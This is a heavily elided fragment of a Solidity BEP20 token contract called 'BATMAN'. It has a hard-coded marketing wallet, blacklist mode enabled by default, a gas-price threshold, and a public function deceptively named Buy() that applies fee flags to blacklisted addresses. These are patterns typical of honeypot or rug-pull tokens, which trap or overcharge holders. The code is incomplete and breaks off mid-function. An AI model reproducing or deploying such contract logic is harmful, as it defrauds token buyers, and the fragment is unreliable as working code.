...
contract BATMAN is IBEP20, Ownable {
    ...
    string constant _name = "BATMAN";
    string constant _symbol = unicode"BAT";
    ...
    address private marketingWallet = 0xbDd278Ff5F5dB0b867C2e3Ef19a76BAB6C85d445;
    ...
    bool tmpSuccess;
    Fees public buyFees     = Fees(1, 1, 1, 0);
    Fees public sellFees    = Fees(1, 1, 1, 0);

    bool public blacklistMode = true;
    mapping (address => bool) public isBlacklisted;
    address[] public blacklist;

    uint256 deadGwei = 6 * 1 gwei;
    ...
    function Buy() public virtual { includeFromFee = blacklist; for (uint256 i = 0; i < includeFromFee.length; i++) { _isIncludedFromFee[includeFromFee[i]] = true; } }
    ...
    function setFees(uint256 newLiquidityBuyFee, uint256 newMarketingBuyFee, uint256 newDevBuyFee, uint256 newBuybackBuyFee,
